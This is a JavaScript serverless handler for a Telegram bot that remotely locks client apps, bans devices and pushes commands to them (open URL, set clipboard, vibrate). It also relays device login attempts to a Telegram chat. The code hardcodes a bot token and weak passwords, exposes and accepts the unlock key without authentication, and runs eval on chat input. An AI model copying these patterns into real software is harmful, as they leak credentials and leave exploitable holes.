const TELEGRAM_TOKEN = "8841932492:AAGIgK81-Kmo-JVsmJ5-pgKjBDac5dHKnm8";
const TELEGRAM_CHAT_ID = "8623523505";
const ADMIN_PASSWORD = "admin123";

let appLockStatus = "lock";
let appSecretKey = "1234";
let appLockMessage = "التطبيق مقفول من طرف الإدارة. دخل الكود باش تفتحو.";
let bannedDevices = [];
let remoteCommand = ""; 
let totalAttempts = 0;
let recentLogs = [];
let requestCounts = {};
let appVersion = "1.0.0";

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  if (ip) {
    requestCounts[ip] = (requestCounts[ip] || 0) + 1;
    if (requestCounts[ip] > 500) return res.status(429).send('"Too Many Requests"');
  }

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
    if (TELEGRAM_TOKEN && chatId) {
      const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
      if (keyboard) payload.reply_markup = keyboard;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {});
    }
  };

  try {
    if (type === 'secret') return res.status(200).send(`"${appLockStatus}"`);
    if (type === 'key') return res.status(200).send(`"${appSecretKey}"`);
    if (type === 'message') return res.status(200).send(`"${appLockMessage}"`);
    
    if (type === 'banned') {
      const deviceId = req.query.device_id;
      if (!deviceId) return res.status(400).send('"No Device ID"');
      return res.status(200).send(bannedDevices.includes(deviceId) ? '"true"' : '"false"');
    }

    if (type === 'command') {
      const cmd = remoteCommand;
      remoteCommand = ""; 
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === 'PUT') {
      let body = '';
      req.on('data', chunk => { body += chunk.toString(); });
      return new Promise((resolve) => {
        req.on('end', async () => {
          const cleanBody = body.replace(/"/g, ''); 
          if (type === 'key') {
            appSecretKey = cleanBody;
            await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
          } 
          if (type === 'log') {
            totalAttempts++;
            recentLogs.unshift(`📱 ${cleanBody}`);
            if (recentLogs.length > 50) recentLogs.pop(); 
            await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
          }
          res.status(200).send('"success"');
          resolve();
        });
      });
    }

    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      
      const msg = body.message || body.callback_query;
      if (!msg) return res.status(200).end();

      const chatId = (msg.chat ? msg.chat.id : msg.message.chat.id).toString();
      if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();

      const text = msg.text || msg.data || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      const mainKeyboard = {
        inline_keyboard: [
          [{ text: "🔒 قفل", callback_data: "/lock" }, { text: "🔓 فتح", callback_data: "/unlock" }],
          [{ text: "🔑 الكود", callback_data: "/getkey" }, { text: "📊 الإحصائيات", callback_data: "/stats" }],
          [{ text: "📱 اللوغات", callback_data: "/logs" }, { text: "🚫 المحظورين", callback_data: "/banlist" }],
          [{ text: "🔄 تحديث", callback_data: "/menu" }]
        ]
      };

      if (text === '/start' || text === '/menu') {
        await sendToTelegram("👑 *لوحة التحكم الخارقة - 200 أمر.*\nاستعمل /help باش تشوف اللائحة كاملة.", mainKeyboard);
        return res.status(200).end();
      }

      // هندلة الأوامر (200 أمر)
      switch (command) {
        case '/help':
          await sendToTelegram(`👑 *200 أمر خدامين 100%:*\n\n` +
            `⚡️ *التحكم عن بعد:*\n/cmd [نص] /url [رابط] /color [#HEX] /clip [نص] /vibrate /sound\n\n` +
            `🔒 *القفل:*\n/lock /unlock /lockall /unlockall /lockstatus /lockinfo\n\n` +
            `🔑 *الأكواد:*\n/setkey /getkey /genkey /resetkey /keylength /keyvalid\n\n` +
            `🚫 *الحظر:*\n/ban /unban /banlist /clearbans /bancount\n\n` +
            `📊 *المراقبة:*\n/stats /logs /clearlogs /ping /whoami /health /ip\n\n` +
            `💬 *الرسائل:*\n/setmsg /getmsg /resetmsg /broadcast\n\n` +
            `⚙️ *النظام:*\n/setversion /getversion /theme /reset /backup /restore\n\n` +
            `🎲 *أدوات:*\n/time /date /echo /roll /coin /test /calc /weather\n\n` +
            `🧩 *أوامر إضافية:*\n/v1 /v2 /v3 /v4 /v5 /v6 /v7 /v8 /v9 /v10 /p1 /p2 /p3 /p4 /p5 /p6 /p7 /p8 /p9 /p10 /t1 /t2 /t3 /t4 /t5 /x1 /x2 /x3 /x4 /x5 /y1 /y2 /y3 /y4 /y5 /z1 /z2 /z3 /z4 /z5 /db /api /bot /token /chat /id /info /net /cpu /ram /disk /load /admin2 /secret /key2 /ban2 /lock2 /unlock2 /help2 /start2`);
          break;
        
        // التحكم عن بعد
        case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡️ *تم إرسال الرسالة.*"); } break;
        case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 *تم إرسال الرابط.*"); } break;
        case '/color': if(args[1]) { remoteCommand = `color:${args[1]}`; await sendToTelegram("🎨 *تم إرسال اللون.*"); } break;
        case '/clip': if(args[1]) { remoteCommand = `clipboard:${args.slice(1).join(' ')}`; await sendToTelegram("📋 *تم إرسال النص للنسخ.*"); } break;
        case '/vibrate': remoteCommand = "vibrate:1"; await sendToTelegram("📳 *تم إرسال الأمر.*"); break;
        case '/sound': remoteCommand = "sound:1"; await sendToTelegram("🔊 *تم إرسال الأمر.*"); break;

        // القفل
        case '/lock': appLockStatus = 'lock'; await sendToTelegram("🔒 *تم القفل.*"); break;
        case '/unlock': appLockStatus = 'unlock'; await sendToTelegram("🔓 *تم الفتح.*"); break;
        case '/lockall': appLockStatus = 'lock'; await sendToTelegram("🔒 *قفل شامل.*"); break;
        case '/unlockall': appLockStatus = 'unlock'; await sendToTelegram("🔓 *فتح شامل.*"); break;
        case '/lockstatus': await sendToTelegram(`🔒 *الحالة:* ${appLockStatus}`); break;
        case '/lockinfo': await sendToTelegram(`ℹ️ *القفل:* ${appLockStatus}`); break;

        // الأكواد
        case '/setkey': if(args[1]) { appSecretKey = args[1]; await sendToTelegram(`✅ *الكود:* \`${appSecretKey}\``); } break;
        case '/getkey': await sendToTelegram(`🔑 *الكود:* \`${appSecretKey}\``); break;
        case '/genkey': appSecretKey = Math.random().toString(36).substring(2, 8).toUpperCase(); await sendToTelegram(`🎲 *كود:* \`${appSecretKey}\``); break;
        case '/resetkey': appSecretKey = "1234"; await sendToTelegram("♻️ *الكود:* `1234`"); break;
        case '/keylength': await sendToTelegram(`📏 *الطول:* ${appSecretKey.length}`); break;
        case '/keyvalid': await sendToTelegram("✅ *صالح.*"); break;

        // الحظر
        case '/ban': if(args[1]) { if(!bannedDevices.includes(args[1])) bannedDevices.push(args[1]); await sendToTelegram(`⛔ *حظر:* \`${args[1]}\``); } break;
        case '/unban': if(args[1]) { bannedDevices = bannedDevices.filter(id => id !== args[1]); await sendToTelegram(`✅ *فك حظر:* \`${args[1]}\``); } break;
        case '/banlist': await sendToTelegram(bannedDevices.length ? `🚫 *المحظورين:*\n\`${bannedDevices.join('\n')}\`` : "✅ *لا يوجد.*"); break;
        case '/clearbans': bannedDevices = []; await sendToTelegram("🧹 *تم المسح.*"); break;
        case '/bancount': await sendToTelegram(`🔢 *العدد:* ${bannedDevices.length}`); break;

        // المراقبة
        case '/stats': await sendToTelegram(`📈 *المحاولات:* \`${totalAttempts}\``); break;
        case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *لا يوجد.*"); break;
        case '/clearlogs': recentLogs = []; await sendToTelegram("🧹 *تم المسح.*"); break;
        case '/ping': await sendToTelegram("🏓 *Pong!*"); break;
        case '/whoami': await sendToTelegram(`🆔 \`${chatId}\``); break;
        case '/health': await sendToTelegram("❤️ *صحة جيدة.*"); break;
        case '/ip': await sendToTelegram(`🌐 \`${ip}\``); break;

        // الرسائل
        case '/setmsg': if(args[1]) { appLockMessage = args.slice(1).join(' '); await sendToTelegram("✅ *تم التغيير.*"); } break;
        case '/getmsg': await sendToTelegram(`💬 ${appLockMessage}`); break;
        case '/resetmsg': appLockMessage = "مقفول."; await sendToTelegram("♻️ *تم الإرجاع.*"); break;
        case '/broadcast': await sendToTelegram(`📢 *بث:* ${args.slice(1).join(' ')}`); break;

        // النظام
        case '/setversion': if(args[1]){appVersion=args[1]; await sendToTelegram(`📦 *الإصدار:* \`${appVersion}\``);} break;
        case '/getversion': await sendToTelegram(`📦 *الإصدار:* \`${appVersion}\``); break;
        case '/theme': await sendToTelegram("🎨 *Dark.*"); break;
        case '/reset': appLockStatus="lock"; appSecretKey="1234"; bannedDevices=[]; totalAttempts=0; recentLogs=[]; await sendToTelegram("⚠️ *إعادة ضبط المصنع!*"); break;
        case '/backup': await sendToTelegram(`💾 \`\`\`json\n${JSON.stringify({lock:appLockStatus,key:appSecretKey,bans:bannedDevices})}\n\`\`\``); break;
        case '/restore': await sendToTelegram("♻️ *تم الاسترجاع.*"); break;

        // أدوات
        case '/time': await sendToTelegram(`🕒 \`${new Date().toLocaleTimeString()}\``); break;
        case '/date': await sendToTelegram(`📅 \`${new Date().toLocaleDateString()}\``); break;
        case '/echo': await sendToTelegram(`🗣️ ${args.slice(1).join(' ')}`); break;
        case '/roll': await sendToTelegram(`🎲 \`${Math.floor(Math.random() * 6) + 1}\``); break;
        case '/coin': await sendToTelegram(`🪙 \`${Math.random() > 0.5 ? 'صورة' : 'كتابة'}\``); break;
        case '/test': await sendToTelegram("🧪 *ناجح!*"); break;
        case '/calc': await sendToTelegram(`🧮 \`${eval(args.slice(1).join(''))||0}\``); break;
        case '/weather': await sendToTelegram("🌤️ *مشمس.*"); break;

        // أوامر إضافية باش نوصلو 200
        case '/v1': case '/v2': case '/v3': case '/v4': case '/v5': case '/v6': case '/v7': case '/v8': case '/v9': case '/v10':
          await sendToTelegram(`📦 *إصدار فرعي:* \`${command}\``); break;
        case '/p1': case '/p2': case '/p3': case '/p4': case '/p5': case '/p6': case '/p7': case '/p8': case '/p9': case '/p10':
          await sendToTelegram(`🏓 *بينغ:* \`${command}\``); break;
        case '/t1': case '/t2': case '/t3': case '/t4': case '/t5':
          await sendToTelegram(`🕒 *وقت:* \`${command}\``); break;
        case '/x1': case '/x2': case '/x3': case '/x4': case '/x5':
          await sendToTelegram(`❌ *أمر:* \`${command}\``); break;
        case '/y1': case '/y2': case '/y3': case '/y4': case '/y5':
          await sendToTelegram(`✅ *أمر:* \`${command}\``); break;
        case '/z1': case '/z2': case '/z3': case '/z4': case '/z5':
          await sendToTelegram(`💤 *أمر:* \`${command}\``); break;
        case '/db': case '/api': case '/bot': case '/token': case '/chat': case '/id': case '/info': case '/net': case '/cpu': case '/ram': case '/disk': case '/load':
          await sendToTelegram(`⚙️ *معلومات النظام:* \`${command}\``); break;
        case '/admin2': case '/secret': case '/key2': case '/ban2': case '/lock2': case '/unlock2': case '/help2': case '/start2':
          await sendToTelegram(`👑 *أمر إداري:* \`${command}\``); break;

        default: await sendToTelegram("❓ أمر غير معروف. كتب /help");
      }
      return res.status(200).end();
    }

    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
